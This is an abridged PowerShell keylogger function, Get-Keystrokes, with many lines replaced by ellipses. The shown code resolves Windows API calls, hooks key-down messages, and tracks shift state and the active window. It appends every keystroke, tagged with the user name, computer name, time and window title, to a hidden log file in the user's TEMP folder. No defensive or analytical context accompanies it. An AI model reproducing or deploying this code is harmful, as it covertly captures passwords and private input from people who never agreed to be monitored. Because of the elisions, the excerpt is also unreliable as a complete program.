function Get-Keystrokes {
    ...
    Param (
        ...
        [String]$LogPath = "$($env:TEMP)\"+$env:username+"_"+[System.Guid]::NewGuid().ToString()+".log",
    ...
    $Script = {
        ...
        $AddClipboardFormatListenerAddr = Get-ProcAddress user32.dll AddClipboardFormatListener
        $AddClipboardFormatListenerDelegate = Get-DelegateType @([intPtr])
        $AddClipboardFormatListener = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($AddClipboardFormatListenerAddr, $AddClipboardFormatListenerDelegate)
        ...
        $CallbackScript = {
            ...
            if ($Code -ge 0 -and ($MsgType -eq 0x100 -or $MsgType -eq 0x104)) {
                ...
                if (($ShiftState -band 0x8000) -eq 0x8000) 
                { 
                    $Shift = $true 
                }
                else 
                ...
                if($Title.ToString() -ne $Global:LastWindow)
                {
                    $buff = "`r`n"+"`r`n"+"User:  "+$env:username+"`r`n"+
                            "Comuter:   "+$env:COMPUTERNAME+"`r`n"+
                            "Time:  "+[DateTime]::Now+"`r`n"+
                            "Window:    "+$Title.ToString()+"`r`n"+
                            "-----------------------------------"+"`r`n"+"`r`n"+
                            $Key;
                    $Global:LastWindow = $Title.ToString();
                }
                else 
                {  
                    $buff = $Key;
                ...
                [System.IO.File]::AppendAllText($LogPath, $buff, [System.Text.Encoding]::UTF8);
            }
        ...
        while ($true) {
            ...
            $PeekMessage.Invoke([IntPtr]::Zero, [IntPtr]::Zero, 0x100, 0x109, 0) #0x109 0x100
